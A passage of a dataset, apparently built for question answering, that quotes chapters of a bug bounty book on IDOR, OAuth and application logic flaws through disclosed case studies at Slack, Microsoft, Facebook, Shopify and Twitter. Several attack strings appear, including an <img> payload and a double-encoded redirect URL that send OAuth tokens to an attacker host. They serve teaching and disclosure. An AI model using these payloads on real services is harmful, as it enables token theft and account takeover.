    "output": "Download from www.finelybook.com 7450911@qq.com\n<BUILDSECRET>&amp;next=%2d. This URL authenticated a user\nand redirected them to the associated Mopub account, which would\nhave allowed a malicious user to log into the account of any other\nuser. The malicious user would have had access to the target account’s\napps and organizations from Twitter’s mobile development platform.\nTwitter responded to Reni’s comment requesting additional\ninformation and the steps to reproduce the attack, which Reni\nprovided.\nTakeaways\nAlways be sure to confirm the full impact of your bugs, especially\nwhen it comes to IDORs. In this case, Reni found he could obtain\nsecret values by accessing POST requests and using a single Google\ndork. Reni initially reported that Twitter was leaking sensitive\ninformation, but only later did he realize how these values were used\non the platform. If Reni hadn’t provided additional information after\nsubmitting his report, Twitter likely wouldn’t have realized that they\nwere vulnerable to account takeovers and they might have paid Reni\nless.\nACME CUSTOMER INFORMATION\nDISCLOSURE\nDifficulty: High\nURL: https://www.<acme>.com/customer_summary?\ncustomer_id=abeZMloJyUovapiXqrHyi0DshH\nSource: N/A\nDate reported: February 20, 2017\n285\nDownload from www.finelybook.com 7450911@qq.com\nBounty paid: $3,000\nThis bug is part of a private program on HackerOne. This\nvulnerability remains undisclosed, and all information in it has been\nanonymized.\nA company, which I’ll refer to as ACME Corp for the sake of this\nexample, created software that allows administrators to create users\nand assign permissions to those users. When I started testing the\nsoftware for vulnerabilities, I used my administrator account to create\na second user with no permissions. Using the second user account, I\nbegan visiting URLs the administrator was able to access that\nshouldn’t have been accessible to the second user.\nUsing my unprivileged account, I visited a customer details page\nthrough the URL www.\n<acme>.com/customization/customer_summary?\ncustomer_id=abeZMloJyUovapiXqrHyi0DshH. This URL returns\ncustomer information based on the ID passed to the customer_id\nparameter. I was surprised to see that customer details were being\nreturned to the second user account.\nAlthough the customer_id appeared to be unguessable, it might be\nmistakenly disclosed on the site somewhere. Alternatively, if a user\nhad their permission revoked, they would still be able to access\ncustomer information if they knew the customer_id. I reported the bug\nwith this reasoning. In hindsight, I should have looked for the leaked\ncustomer_id before reporting.\nThe program closed my report as informative on the grounds that\nthe customer_id was unguessable. Informative reports don’t result in a\nbounty and can negatively impact your HackerOne stats. Undeterred, I\nstarted looking for places where the ID could be leaked by testing all\n286\nDownload from www.finelybook.com 7450911@qq.com\nthe endpoints I could find. Two days later, I found a vulnerability.\nI began accessing URLs with a user that only had permission to\nsearch orders and shouldn’t have had any access to customer or\nproduct information. But I found a response from an order search that\nproduced the following JSON:\n{\n\"select\": \"(*,hits.(data.(order_no, customer_info, product_items.(product_\nid,item_text), status, creation_date, order_total, currency)))\",\n\"_type\": \"order_search_result\",\n\"count\": 1,\n\"start\": 0,\n\"hits\": [{\n\"data\": {\n\"order_no\": \"00000001\",\n\"product_items\": [{\n\"_type\": \"product_item\",\n\"product_id\": \"test1231234\",\n\"item_text\": \"test\"\n}],\n\"_type\": \"order\",\n\"creation_date\": \"2017-02-25T02:31Z\",\n\"customer_info\": {\n\"customer_no\": \"00006001\",\n\"_type\": \"customer_info\",\n\"customer_name\": \"pete test\",\n\"customer_id\": \"abeZMloJyUovapiXqHyi0DshH\",\n\"email\": \"test@gmail.com\"\n}\n}\n}]\n}--snip--\nNotice that the JSON includes a customer_id ➊, which was the same\nas the ID being used in the URL that would display customer\ninformation. This meant that the customer ID was being leaked, and\n287\nDownload from www.finelybook.com 7450911@qq.com\nan unprivileged user could find and access customer information they\nshouldn’t have had the permissions to see.\nIn addition to finding the customer_id, I continued to investigate the\nextent of the vulnerability. I discovered other IDs that could also be\nused in URLs to return information that should have been\ninaccessible. My second report was accepted and paid a bounty.\nTakeaways\nWhen you find a vulnerability, make sure you understand the extent to\nwhich an attacker can use it. Try to find leaked identifiers or other IDs\nthat could have a similar vulnerability. Additionally, don’t be\ndiscouraged if a program disagrees with your report. You can keep\nlooking for other places in which you might be able to use the\nvulnerability and can submit another report if you find any further\ninformation.\nSUMMARY\nIDORs occur when an attacker can access or modify a reference to an\nobject that they shouldn’t be able to access. IDORs can be simple:\nthey might require exploiting numerically incremented integers by\nadding and subtracting 1. For more complex IDORs that make use of\nUUIDs or random identifiers, you might need to test the platform\nthoroughly for leaks. You can check for leaks in a variety of places,\nsuch as in JSON responses, in HTML content, through Google dorks,\nand through URLs. When you’re reporting, be sure to detail how an\nattacker can abuse the vulnerability. For example, the bounty for a\nvulnerability where an attacker could bypass platform permissions\nwill be less than the bounty for a bug that results in a full account\n288\nDownload from www.finelybook.com 7450911@qq.com\ntakeover.\n289\nDownload from www.finelybook.com 7450911@qq.com\n17\nOAUTH VULNERABILITIES\nOAuth is an open protocol that simplifies and standardizes secure\nauthorization on web, mobile, and desktop applications. It allows\nusers to create accounts on websites without having to create a\nusername or password. It’s commonly seen on websites as the Sign in\nwith platform button like the one shown in Figure 17-1, where the\nplatform is Facebook, Google, LinkedIn, Twitter, or so on.\nFigure 17-1: Example OAuth Sign in with Google button\nOAuth vulnerabilities are a type of application configuration\nvulnerability, meaning they rely on a developer’s implementation\nmistakes. However, given the impact and frequency of OAuth\nvulnerabilities, they’re worth devoting an entire chapter to. Although\nthere are many kinds of OAuth vulnerabilities, the examples in this\nchapter will mainly include cases when an attacker is able to exploit\nOAuth to steal authentication tokens and access a targeted user’s\naccount information on the resource server.\n290\nDownload from www.finelybook.com 7450911@qq.com\nAt the time of writing, OAuth has two versions, 1.0a and 2.0,\nwhich are incompatible with each other. Entire books have been\nwritten on OAuth, but this chapter focuses on OAuth 2.0 and the basic\nOAuth workflow.\nTHE OAUTH WORKFLOW\nThe OAuth process is complex, so let’s begin with basic terms. Three\nactors are involved in the most basic OAuth flow:\nThe resource owner is the user attempting to log in via OAuth.\nThe resource server is a third-party API that authenticates the resource\nowner. Any site can be a resource server, but the most popular ones\ninclude Facebook, Google, LinkedIn, and so on.\nThe client is the third-party application that the resource owner visits. The\nclient is allowed to access data on the resource server.\nWhen you attempt to log in using OAuth, the client requests access\nto your information from the resource server and asks the resource\nowner (in this case, you) for approval to access the data. The client\nmight ask for access to all your information or only specific pieces.\nThe information that a client requests is defined by scopes. Scopes are\nsimilar to permissions in that they restrict what information an\napplication can access from the resource server. For example,\nFacebook scopes include the user’s email, public_profile, user_friends, and\nso on. If you grant a client access to only the email scope, the client\ncan’t access your profile information, friends list, and other\ninformation.\nNow that you understand the actors involved, let’s examine the\nOAuth process when logging into a client for the first time using\n291\nDownload from www.finelybook.com 7450911@qq.com\nFacebook as the example resource server. The OAuth process begins\nwhen you visit a client and click the Login with Facebook button. This\nresults in a GET request to an authentication endpoint on the client.\nOften, the path looks like this: https://www.\n<example>.com/oauth/facebook/. Shopify, for example, uses Google\nfor OAuth with the URL\nhttps://<STORE>.myshopify.com/admin/auth/login?google_apps=1/.\nThe client responds to this HTTP request with a 302 redirect to the\nresource server. The redirect URL will include parameters to facilitate\nthe OAuth process, which are defined as follows:\nThe client_id identifies the client to the resource server. Each client will\nhave its own client_id so the resource server can identify the application\ninitiating the request to access the resource owner’s information.\nThe redirect_uri identifies where the resource server should redirect the\nresource owner’s browser after the resource server has authenticated the\nresource owner.\nThe response_type identifies what type of response to provide. This is\nusually a token or code, although a resource server can define other\naccepted values. A token response type provides an access token that\nimmediately allows access to information from the resource server. A\ncode response type provides an access code that must be exchanged for an\naccess token via an extra step in the OAuth process.\nThe scope, mentioned earlier, identifies the permissions a client is\nrequesting to access from the resource server. During the first\nauthorization request, the resource owner should be presented with a\ndialog to review and approve the requested scopes.\nThe state is an unguessable value that prevents cross-site request\nforgeries. This value is optional but should be implemented on all OAuth\napplications. It should be included in the HTTP request to the resource\nserver. Then it should be returned and validated by the client to ensure an\nattacker can’t maliciously invoke the OAuth process on another user’s\nbehalf.\n292\nDownload from www.finelybook.com 7450911@qq.com\nAn example URL initiating the OAuth process with Facebook\nwould look like this: https://www.facebook.com/v2.0/dialog/oauth?\nclient_id=123&redirect_uri=https%3A%2F%2Fwww.\n<example>.com%2Foauth%2Fcallback&response_type=token&scop\ne=email&state=XYZ\nAfter receiving the 302 redirect response, the browser sends a GET\nrequest to the resource server. Assuming you’re logged in to the\nresource server, you should see a dialog to approve the client’s\nrequested scopes. Figure 17-2 shows an example of the website Quora\n(the client) requesting access to information from Facebook (the\nresource server) on the resource owner’s behalf.\nClicking the Continue as John button approves Quora’s request to\naccess the listed scopes, including the resource owner’s public profile,\nfriends list, birthday, hometown, and so on. After the resource owner\nclicks the button, Facebook returns a 302 HTTP response redirecting\nthe browser back to the URL defined by the redirect_uri parameter\ndiscussed previously. The redirect also includes a token and the state\nparameter. Here’s an example of a URL redirect from Facebook to\nQuora (which has been modified for this book):\nhttps://www.quora.com?\naccess_token=EAAAAH86O7bQBAApUu2ZBTuEo0MZA5xBXTQi\nxBUYxrauhNqFtdxViQQ3CwtliGtKqljBZA8&expires_in=5625&st\nate=F32AB83299DADDBAACD82DA\nIn this case, Facebook returned an access token that Quora (the\nclient) could use to immediately query the resource owner’s\ninformation. Once the client has the access_token, the resource\nowner’s involvement in the OAuth process is complete. The client\nwould query the Facebook API directly to obtain the information it\n293\nDownload from www.finelybook.com 7450911@qq.com\nrequires about the resource owner. The resource owner would be able\nto use the client without being aware of the interaction between the\nclient and API.\nFigure 17-2: Quora login with Facebook OAuth scope authorization\nHowever, if Facebook returned a code instead of an access token,\n294\nDownload from www.finelybook.com 7450911@qq.com\nQuora would need to exchange that code for an access token to query\ninformation from the resource server. This process is completed\nbetween the client and the resource server without the resource\nowner’s browser. To obtain a token, the client makes its own HTTP\nrequest to the resource server that includes three URL parameters: an\naccess code, the client_id, and a client_secret. The access code is the\nvalue returned from the resource server through the 302 HTTP\nredirect. The client_secret is a value meant to be kept private by the\nclient. It is generated by the resource server when the application is\nconfigured and the client_id is assigned.\nFinally, once the resource server receives a request from the client\nwith the client_secret, client_id, and access code, it validates the\nvalues and returns an access_token to the client. At this stage, the\nclient can query the resource server for information about the resource\nowner, and the OAuth process is complete. Once you’ve approved a\nresource server to access your information, the next time you log in to\nthe client using Facebook, the OAuth authentication process will\nusually happen in the background. You won’t see any of this\ninteraction unless you monitor your HTTP requests. Clients can\nchange this default behavior to require resource owners to\nreauthenticate and approve scopes; however, this is very uncommon.\nThe severity of an OAuth vulnerability depends on the permitted\nscopes associated with the stolen token, as you’ll see in the following\nexamples.\nSTEALING SLACK OAUTH TOKENS\nDifficulty: Low\nURL: https://slack.com/oauth/authorize/\n295\nDownload from www.finelybook.com 7450911@qq.com\nSource: http://hackerone.com/reports/2575/\nDate reported: March 1, 2013\nBounty paid: $100\nA common OAuth vulnerability occurs when a developer improperly\nconfigures or compares permitted redirect_uri parameters, allowing\nattackers to steal OAuth tokens. In March 2013, Prakhar Prasad found\njust that on Slack’s OAuth implementation. Prasad informed Slack\nthat he could bypass their redirect_uri restrictions by appending\nanything to a whitelisted redirect_uri. In other words, Slack was only\nvalidating the beginning of the redirect_uri parameter. If a developer\nregistered a new application with Slack and whitelisted https://www.\n<example>.com, an attacker could append a value to the URL and\ncause the redirect to go somewhere unintended. For example,\nmodifying the URL to pass redirect_uri=https://<attacker>.com\nwould be rejected, but passing redirect_uri=https://www.\n<example>.com.mx would be accepted.\nTo exploit this behavior, an attacker only has to create a matching\nsubdomain on their malicious site. If a targeted user visits the\nmaliciously modified URL, Slack sends the OAuth token to the\nattacker’s site. An attacker could invoke the request on behalf of the\ntargeted user by embedding an <img> tag on a malicious web page,\nsuch as <img src=https://slack.com/oauth/authorize?\nresponse_type=token&client_id=APP_ID&redirect_uri=https://www.example.com.\nattacker.com>. Using an <img> tag automatically invokes an HTTP GET\nrequest when rendered.\nTakeaways\nVulnerabilities in which the redirect_uri haven’t been strictly checked\n296\nDownload from www.finelybook.com 7450911@qq.com\nare a common OAuth misconfiguration. Sometimes, the vulnerability\nis the result of an application registering a domain, such as *.\n<example>.com, as an acceptable redirect_uri. Other times, it’s the\nresult of a resource server not performing a strict check on the\nbeginning and end of the redirect_uri parameter. In this example, it\nwas the latter. When you’re looking for OAuth vulnerabilities, always\nbe sure to test any parameter that indicates a redirection is being used.\nPASSING AUTHENTICATION WITH\nDEFAULT PASSWORDS\nDifficulty: Low\nURL: https://flurry.com/auth/v1/account/\nSource: https://lightningsecurity.io/blog/password-not-provided/\nDate reported: June 30, 2017\nBounty paid: Undisclosed\nLooking for vulnerabilities in any OAuth implementation involves\nreviewing the entire authentication process, from start to finish. This\nincludes recognizing HTTP requests that aren’t part of the\nstandardized process. Such requests commonly indicate that the\ndevelopers have customized the process and might have introduced\nbugs. Jack Cable noticed such a situation in June 2017, when he\nlooked at Yahoo’s bug bounty program.\nYahoo’s bounty program included the analytics site Flurry.com.\nTo begin his testing, Cable registered for a Flurry account using his\n@yahoo.com email address through Yahoo’s OAuth implementation.\nAfter Flurry and Yahoo! exchanged the OAuth token, the final POST\nrequest to Flurry was the following:\n297\nDownload from www.finelybook.com 7450911@qq.com\nPOST /auth/v1/account HTTP/1.1\nHost: auth.flurry.com\nConnection: close\nContent-Length: 205\nContent-Type: application/vnd.api+json\nDNT: 1\nReferer: https://login.flurry.com/signup\nAccept-Language: en-US,en;q=0.8,la;q=0.6\n{\"data\":{\"type\":\"account\",\"id\":\"...\",\"attributes\":{\"email\":...@yahoo.com,\n\"companyName\":\"1234\",\"firstname\":\"jack\",\"lastname\":\"cable\",➊\"password\":\n\"not-provided\"}}}\nThe \"password\":\"not-provided\" part of the request ➊ caught Cable’s\neye. Logging out of his account, he revisited https://login.flurry.com/\nand signed in without using OAuth. Instead, he provided his email\naddress and the password not-provided. This worked and Cable was\nlogged into his account.\nIf any user registered for Flurry using their Yahoo! account and the\nOAuth process, Flurry would register the account in their system as\nthe client. Then Flurry would save the user account with the default\npassword not-provided. Cable submitted the vulnerability, and Yahoo!\nfixed it with within five hours of receiving his report.\nTakeaways\nIn this case, Flurry included an extra, custom step in the authentication\nprocess that used a POST request to create a user account after a user\nwas authenticated. Custom OAuth implementation steps are often\nmisconfigured and result in vulnerabilities, so be sure to test these\nprocesses thoroughly. In this example, Flurry likely built its OAuth\nworkflow on top of the existing user registration process to match the\nrest of the application. Flurry likely didn’t require users to create an\naccount prior to implementing Yahoo! OAuth. To accommodate users\n298\nDownload from www.finelybook.com 7450911@qq.com\nwithout accounts, the Flurry developers probably decided to invoke\nthe same registration POST request to create users. But the request\nrequired a password parameter, so Flurry set an insecure default one.\nSTEALING MICROSOFT LOGIN TOKENS\nDifficulty: High\nURL: https://login.microsoftonline.com\nSource: https://whitton.io/articles/obtaining-tokens-outlook-\noffice-azure-account/\nDate reported: January 24, 2016\nBounty paid: $13,000\nAlthough Microsoft doesn’t implement the standard OAuth flow, it\nuses a process that is very similar and applicable to testing OAuth\napplications. When you’re testing OAuth or any similar authentication\nprocesses, be sure to thoroughly test how redirect parameters are\nbeing validated. One way you can do this is by passing different URL\nstructures to the application. This is exactly what Jack Whitton did in\nJanuary 2016, when he tested Microsoft’s login process and found he\ncould steal authentication tokens.\nBecause it owns so many properties, Microsoft authenticates users\nthrough requests to login.live.com, login.microsoftonline.com, and\nlogin.windows.net depending on the service the user is being\nauthenticated to. These URLs would return a session for the user. For\nexample, the flow for outlook.office.com was the following:\n1. A user would visit https://outlook.office.com.\n2. The user would be redirected to\nhttps://login.microsoftonline.com/login.srf?\n299\nDownload from www.finelybook.com 7450911@qq.com\nwa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%\n2fowa%2f&id=260563.\n3. If the user was logged in, a POST request would be made to the wreply\nparameter with a t parameter containing a token for the user.\nChanging the wreply parameter to any other domain returned a\nprocess error. Whitton also tried double encoding characters by adding\na %252f to the end of the URL to create\nhttps%3a%2f%2foutlook.office.com%252f. In this URL, special\ncharacters are encoded such that a colon (:) is %3a and a slash (/) is\n%2f. When double encoding, the attacker would also encode the\npercent sign (%) in the initial encoding. Doing so would make a\ndouble-encoded slash %252f (encoding special characters was\ndiscussed in “Twitter HTTP Response Splitting” on page 52). When\nWhitton changed the wreply parameter to the double-encoded URL, the\napplication returned an error that indicated\nhttps://outlook.office.com%f wasn’t a valid URL.\nNext, Whitton appended @example.com to the domain, which\ndidn’t result in an error. Instead, it returned\nhttps://outlook.office.com%2f@example.com/?wa=wsignin1.0. The\nreason it did this is that the structure of a URL is the scheme:\n[//[username:password@]host[:port]][/]path[?query][#fragment].\nThe username and password parameters pass basic authorization\ncredentials to a website. So, by adding @example.com, the redirect\nhost was no longer outlook.office.com. Instead, the redirect could be\nset to any attacker-controlled host.\nAccording to Whitton, the cause of this vulnerability was the way\nin which Microsoft was handling decoding and URL validation.\nMicrosoft was likely using a two-step process. First, Microsoft would\n300\nDownload from www.finelybook.com 7450911@qq.com\nperform a sanity check and ensure the domain was valid and\nconforming to the URL structure scheme. The URL\nhttps://outlook.office.com%2f@example.com was valid because\noutlook.office.com%2f would be recognized as a valid username.\nSecond, Microsoft would decode the URL recursively until there\nwere no other characters to decode. In this case,\nhttps%3a%2f%2foutlook.office.com%252f@example.com would be\nrecursively decoded until it returned\nhttps://outlook.office.com/@example.com. This meant @example.com\nwas recognized as part of the URL path but not the host. The host\nwould be validated as outlook.office.com because @example.com\ncomes after a slash.\nWhen the parts of the URL were combined, Microsoft validated\nthe URL structure, decoded the URL, and validated it as being\nwhitelisted but returned a URL that was only decoded once. This\nmeant that any targeted user who visited\nhttps://login.microsoftonline.com/login.srf?\nwa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.co\nm%252f@example.com&id=260563 would have their access token\nsent to example.com. The malicious owner of example.com could then\nlog in to the Microsoft service associated with the received token and\naccess other people’s accounts.\nTakeaways\nWhen you’re testing redirect parameters in the OAuth flow, include\n@example.com as part of the redirect URI to see how the application\nhandles it. You should do this especially when you notice that the\nprocess is utilizing encoded characters that the application needs to\ndecode to validate a whitelisted redirect URL. Additionally, always\n301\nDownload from www.finelybook.com 7450911@qq.com\nnote any subtle differences in application behavior while you’re\ntesting. In this case, Whitton noticed that the errors being returned\nwere different when he fully changed the wreply parameter instead of\nappending a double-encoded forward slash. This put him on to\nMicrosoft’s misconfigured validation logic.\nSWIPING FACEBOOK OFFICIAL ACCESS\nTOKENS\nDifficulty: High\nURL: https://www.facebook.com\nSource: http://philippeharewood.com/swiping-facebook-official-\naccess-tokens/\nDate reported: February 29, 2016\nBounty paid: Undisclosed\nWhen you’re looking for vulnerabilities, be sure to consider forgotten\nassets that the target application relies on. In this example, Philippe\nHarewood began with a single goal in mind: to capture a targeted\nuser’s Facebook token and access their private information. But he\nwasn’t able to find any mistakes in Facebook’s OAuth\nimplementation. Undeterred, he pivoted and started looking for a\nFacebook application he could take over, using an idea similar to a\nsubdomain takeover.\nThe idea was predicated on recognizing that the main Facebook\nfunctionality includes some Facebook-owned apps that rely on OAuth\nand are automatically authorized by all Facebook accounts. The list of\nthese preauthorized apps was at\nhttps://www.facebook.com/search/me/apps-used/.\n302\nDownload from www.finelybook.com 7450911@qq.com\nReviewing the list, Harewood found one application that was\nauthorized, even though Facebook no longer owned or used the\ndomain. This meant Harewood could register the whitelisted domain\nas the redirect_uri parameter to receive the Facebook tokens of any\ntargeted user that visited the OAuth authorization endpoint\nhttps://facebook.com/v2.5/dialog/oauth?\nresponse_type=token&display=popup&client_id=APP_ID&redirect_\nuri=REDIRECT_URI/.\nIn the URL, the vulnerable app’s ID is denoted by APP_ID, which\nincluded access to all OAuth scopes. The whitelisted domain is\ndenoted by REDIRECT_URI (Harewood didn’t disclose the\nmisconfigured application). Because the application was already\nauthorized for every Facebook user, any targeted user would never be\nrequired to approve requested scopes. In addition, the OAuth process\nwould proceed entirely in background HTTP requests. By visiting the\nFacebook OAuth URL for this application, users would be redirected\nto the URL\nhttp://REDIRECT_URI/#token=access_token_appended_here/.\nBecause Harewood registered the address for REDIRECT_URI, he\nwas able to log the access token of any user who visited the URL,\nwhich gave him access to their entire Facebook account. Additionally,\nall official Facebook access tokens include access to other Facebook-\nowned properties, such as Instagram. As a result, Harewood could\naccess all Facebook properties on behalf of a targeted user.\nTakeaways\nConsider potential forgotten assets when you’re looking for\nvulnerabilities. In this example, the forgotten asset was a sensitive\nFacebook application with full scope permissions. But other examples\n303\nDownload from www.finelybook.com 7450911@qq.com\ninclude subdomain CNAME records and application dependencies,\nsuch as Ruby Gems, JavaScript libraries, and so on. If an application\nrelies on external assets, developers might someday stop using that\nasset and forget to disconnect it from the application. If an attacker\ncan take over the asset, that could have severe consequences for the\napplication and its users. Additionally, it’s important to recognize that\nHarewood began his testing with a hacking goal in mind. Doing the\nsame is an effective way to focus your energy when you’re hacking on\nlarge applications, where there are an infinite number of areas to test\nand it’s easy to get distracted.\nSUMMARY\nDespite its standardization as an authentication workflow, OAuth is\neasy for developers to misconfigure. Subtle bugs could allow attackers\nto steal authorization tokens and access the private information of\ntargeted users. When you’re hacking on OAuth applications, be sure\nto thoroughly test the redirect_uri parameter to see whether an\napplication is properly validating when access tokens are sent. Also,\nbe on the lookout for custom implementations that support the OAuth\nworkflow; the functionality won’t be defined by the OAuth\nstandardized process and is more likely to be vulnerable. Before\ngiving up on any OAuth hacking, be sure to consider whitelisted\nassets. Confirm whether the client has trusted any application by\ndefault that its developers might have forgotten about.\n304"
  },
  {
    "input": "What are application logic and configuration vulnerabilities, and how can they be identified and exploited?",
    "summary": "Application logic and configuration vulnerabilities arise from coding or setup errors, allowing attackers to perform unintended actions. These types of bugs are harder to detect but can be found by understanding how frameworks and tools are configured. Examples include the Rails mass assignment vulnerability and misconfigured S3 buckets. Testing user permissions, new features, and third-party tools is crucial for identifying these issues. Additionally, automated tools like Nmap and EyeWitness can help discover misconfigurations and hidden endpoints.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n18\nAPPLICATION LOGIC AND\nCONFIGURATION\nVULNERABILITIES\nUnlike the previous bugs covered in this book, which rely on the\nability to submit malicious input, application logic and configuration\nvulnerabilities take advantage of mistakes made by developers.\nApplication logic vulnerabilities occur when a developer makes a\ncoding logic mistake that an attacker can exploit to perform some\nunintended action. Configuration vulnerabilities occur when a\ndeveloper misconfigures a tool, framework, third-party service, or\nother program or code in a way that results in a vulnerability.\nBoth vulnerabilities involve exploiting bugs from decisions a\ndeveloper made when coding or configuring a website. The impact is\noften an attacker having unauthorized access to some resource or\naction. But because these vulnerabilities result from coding and\nconfiguration decisions, they can be difficult to describe. The best way\nto understand these vulnerabilities is to walk through an example.\nIn March 2012, Egor Homakov reported to the Ruby on Rails team\n305\nDownload from www.finelybook.com 7450911@qq.com\nthat its default configuration for the Rails project was insecure. At the\ntime, when a developer installed a new Rails site, the code Rails\ngenerated by default would accept all parameters submitted to a\ncontroller action to create or update database records. In other words,\na default installation would allow anyone to send an HTTP request to\nupdate any user object’s user ID, username, password, and creation\ndate parameters regardless of whether the developer meant for them to\nbe updatable. This example is commonly referred to as a mass\nassignment vulnerability because all parameters can be used to assign\nto object records.\nThis behavior was well-known within the Rails community but few\nappreciated the risk it posed. Rails core developers believed that web\ndevelopers should be responsible for closing this security gap and\ndefining which parameters a site accepts to create and update records.\nYou can read some of the discussion at\nhttps://github.com/rails/rails/issues/5228/.\nThe Rails core developers disagreed with Homakov’s assessment,\nso Homakov exploited the bug on GitHub (a large site developed with\nRails). He guessed an accessible parameter that was used to update the\ncreation date of GitHub issues. He included the creation date\nparameter in an HTTP request and submitted an issue with a creation\ndate years in the future. This shouldn’t have been possible for a\nGitHub user. He also updated GitHub’s SSH access keys to gain\naccess to the official GitHub code repository—a critical vulnerability.\nIn response, the Rails community reconsidered its position and\nstarted requiring developers to whitelist parameters. Now, the default\nconfiguration won’t accept parameters unless a developer marks them\nas safe.\nThe GitHub example combines application logic and configuration\n306\nDownload from www.finelybook.com 7450911@qq.com\nvulnerabilities. The GitHub developers were expected to add security\nprecautions, but because they used the default configuration, they\ncreated a vulnerability.\nApplication logic and configuration vulnerabilities might be\ntougher to find than the vulnerabilities previously covered in this book\n(not that any of the others are easy). That’s because they rely on\ncreative thinking about coding and configuration decisions. The more\nyou know about the internal workings of various frameworks, the\nmore easily you’ll find these types of vulnerabilities. For example,\nHomakov knew the site was built with Rails and how Rails handled\nuser input by default. In other examples, I’ll show how bug reporters\ninvoked direct API calls, scanned thousands of IPs for misconfigured\nservers, and discovered functionality not intended to be publicly\naccessible. These vulnerabilities require background knowledge of\nweb frameworks and investigative skills, so I’ll focus on reports that\nwill help you develop this knowledge rather than reports with a high\npayout.\nBYPASSING SHOPIFY ADMINISTRATOR\nPRIVILEGES\nDifficulty: Low\nURL: <shop>.myshopify.com/admin/mobile_devices.json\nSource: https://hackerone.com/reports/100938/\nDate reported: November 22, 2015\nBounty paid: $500\nLike GitHub, Shopify is built using the Ruby on Rails framework.\nRails is popular because, when you develop a site with it, the\n307\nDownload from www.finelybook.com 7450911@qq.com\nframework handles many common and repetitive tasks, such as\nparsing parameters, routing requests, serving files, and so on. But\nRails doesn’t provide permissions handling by default. Instead,\ndevelopers must code their own permissions handling or install a\nthird-party gem with that functionality (gems are Ruby libraries). As a\nresult, when hacking Rails applications, it’s always a good idea to test\nuser permissions: you might find application logic vulnerabilities, as\nyou would when searching for IDOR vulnerabilities.\nIn this case, rms, the reporter, noticed that Shopify defined a user\npermission called Settings. This permission allowed administrators to\nadd phone numbers to the application through an HTML form when\nplacing orders on the site. Users without this permission weren’t given\na field to submit a phone number on the user interface (UI).\nBy using Burp as a proxy to record the HTTP requests made to\nShopify, rms found the endpoint that HTTP requests for the HTML\nform were being sent to. Next, rms logged into an account that was\nassigned the Settings permission, added a phone number, and then\nremoved that number. Burp’s history tab recorded the HTTP request\nto add the phone number, which was sent to the\n/admin/mobile_numbers.json endpoint. Then rms removed the\nSettings permission from the user account. At this point, the user\naccount shouldn’t have been permitted to add a phone number.\nUsing the Burp Repeater tool, rms bypassed the HTML form and\nsent the same HTTP request to /admin/mobile_number.json while still\nlogged into the account without the Settings permission. The response\nindicated a success, and placing a test order on Shopify confirmed that\nthe notification was sent to the phone number. The Settings\npermission had removed only the frontend UI element where users\ncould enter phone numbers. But the Settings permission wasn’t\n308\nDownload from www.finelybook.com 7450911@qq.com\nblocking a user without permissions from submitting a phone number\non the site’s backend.\nTakeaways\nWhen you’re working on Rails applications, be sure to test all user\npermissions because Rails doesn’t handle that functionality by default.\nDevelopers must implement user permissions, so it’s easy for them to\nforget to add a permission check. Additionally, it’s always a good idea\nto proxy your traffic. That way, you can easily identify endpoints and\nreplay HTTP requests that might not be available through the\nwebsite’s UI.\nBYPASSING TWITTER ACCOUNT\nPROTECTIONS\nDifficulty: Easy\nURL: https://twitter.com\nSource: N/A\nDate reported: October 2016\nBounty paid: $560\nWhen you’re testing, make sure you consider the differences between\nan application’s website and its mobile versions. There could be\napplication logic differences between the two experiences. When\ndevelopers don’t properly consider these differences, they could create\nvulnerabilities, which is what occurred in this report.\nIn the fall of 2016, Aaron Ullger noticed that when he logged into\nTwitter from an unrecognized IP address and browser for the first\ntime, the Twitter website required additional information before\n309\nDownload from www.finelybook.com 7450911@qq.com\nauthentication. The information Twitter requested was typically an\nemail or phone number associated with the account. This security\nfeature was meant to ensure that if your account login were\ncompromised, an attacker couldn’t access the account if they didn’t\nhave that additional information.\nBut during his tests, Ullger used his phone to connect to a VPN,\nwhich assigned the device a new IP address. He would have been\nprompted for additional information when signing in from an\nunrecognized IP address on a browser, but he was never prompted to\ndo so on his phone. This meant that if attackers compromised his\naccount, they could avoid the additional security checks by using the\nmobile application to log in. In addition, attackers could view the\nuser’s email address and phone number within the app, which would\nallow them to log in through the website.\nIn response, Twitter validated and fixed the issue, awarding Ullger\n$560.\nTakeaways\nConsider whether security-related behaviors are consistent across\nplatforms when you access an application using different methods. In\nthis case, Ullger only tested the application’s browser and mobile\nversions. But other websites might use third-party apps or API\nendpoints.\nHACKERONE SIGNAL MANIPULATION\nDifficulty: Low\nURL: hackerone.com/reports/<X>\nSource: https://hackerone.com/reports/106305\n310\nDownload from www.finelybook.com 7450911@qq.com\nDate reported: December 21, 2015\nBounty paid: $500\nWhen developing a site, programmers will likely test new features\nthey implement. But they might neglect to test rare types of input or\nhow the feature they’re developing interacts with other parts of the\nsite. When you’re testing, focus on these areas, and especially on edge\ncases, which are easy ways developers might accidentally introduce\napplication logic vulnerabilities.\nAt the end of 2015, HackerOne introduced new functionality to its\nplatform called Signal, which shows a hacker’s average reputation\nbased on the resolved reports they’ve submitted. For example, reports\nclosed as spam receive –10 reputation, not applicable receive –5,\ninformative receive 0, and resolved receive 7. The closer your Signal\nis to 7, the better.\nIn this case, the reporter Ashish Padelkar recognized that a person\ncould manipulate this statistic by self-closing reports. Self-closing is a\nseparate feature that allows hackers to retract their report if they made\na mistake, and it sets the report to 0 reputation. Padelkar realized that\nHackerOne was using the 0 from self-closed reports to calculate\nSignal. So anyone with a negative Signal could raise their average by\nself-closing reports.\nAs a result, HackerOne removed self-closed reports from Signal\ncalculations and awarded Padelkar a $500 bounty.\nTakeaways\nKeep an eye out for new site functionality: it represents an opportunity\nto test new code and could cause bugs even in existing functionality.\nIn this example, the interaction of self-closed reports and the new\n311\nDownload from www.finelybook.com 7450911@qq.com\nSignal feature resulted in unintended consequences.\nHACKERONE INCORRECT S3 BUCKET\nPERMISSIONS\nDifficulty: Medium\nURL: [REDACTED].s3.amazonaws.com\nSource: https://hackerone.com/reports/128088/\nDate reported: April 3, 2016\nBounty paid: $2,500\nIt’s easy to assume every bug in an application has been found before\nyou’ve even started testing. But don’t overestimate a site’s security or\nwhat other hackers have tested. I had to overcome this mindset when\ntesting for an application configuration vulnerability on HackerOne.\nI noticed that Shopify had disclosed reports about misconfigured\nAmazon Simple Store Services (S3) buckets and decided to see\nwhether I could find similar bugs. S3 is a file management service\nfrom Amazon Web Services (AWS) that many platforms use to store\nand serve static content, such as images. Like all AWS services, S3\nhas complex permissions that are easy to misconfigure. At the time of\nthis report, permissions included the ability to 